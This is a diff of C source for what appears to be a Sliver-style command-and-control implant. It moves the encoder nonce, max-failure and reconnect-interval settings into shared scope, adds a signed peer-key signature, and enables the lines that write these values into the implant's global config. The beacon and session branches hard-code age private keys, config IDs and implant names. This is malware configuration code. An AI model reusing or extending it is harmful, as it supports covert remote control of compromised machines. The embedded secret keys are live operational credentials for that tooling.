@@ -1974,17 +1974,18 @@ VOID Final(VOID)
 	DWORD dwThreadId = 0;
 	PGLOBAL_CONFIG pGlobalConfig = NULL;
 
+	UINT64 uEncoderNonce = 13;
+	DWORD dwMaxFailure = 5;
+	DWORD dwReconnectInterval = 600;
+
 #ifdef _BEACON
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szPeerPubKey[] = "age1z8yd2vkrxqelp82fhhsqwql5zvvjl2jzc2us03uqu9j72ve79g8s4fcp6v";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-12FPRDVR7Y9J7GHHCE3R0UN0MKLC7RS3Z48NW0C9CJ3PWJU3HX6UQFLMXPN";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	UINT64 uEncoderNonce = 13;
 	CHAR szSliverClientName[] = "SOFT_TUNIC";
 	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
-	DWORD dwMaxFailure = 5;
-	DWORD dwReconnectInterval = 600;
 #elif _SESSION
 	// From Tu Dinh
 	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
@@ -2004,11 +2005,10 @@ VOID Final(VOID)
 	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	UINT64 uEncoderNonce = 13;
 	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
 	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
-	DWORD dwMaxFailure = 5;
-	DWORD dwReconnectInterval = 600;
+	
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";
 #else
 	// From Tu Dinh
 	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
@@ -2045,9 +2045,9 @@ VOID Final(VOID)
 	pGlobalConfig->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
 	pGlobalConfig->lpPeerAgePublicKeySignature = DuplicateStrA(szPeerAgePublicKeySignature, 0);
 	lstrcpyA(pGlobalConfig->szSliverName, szSliverClientName);
-	/*pGlobalConfig->uEncoderNonce = uEncoderNonce;
+	pGlobalConfig->uEncoderNonce = uEncoderNonce;
 	pGlobalConfig->dwMaxFailure = dwMaxFailure;
-	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;*/
+	pGlobalConfig->dwReconnectInterval = dwReconnectInterval;
 	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
 	pGlobalConfig->uPeerID = GeneratePeerID();
 #ifdef _BEACON
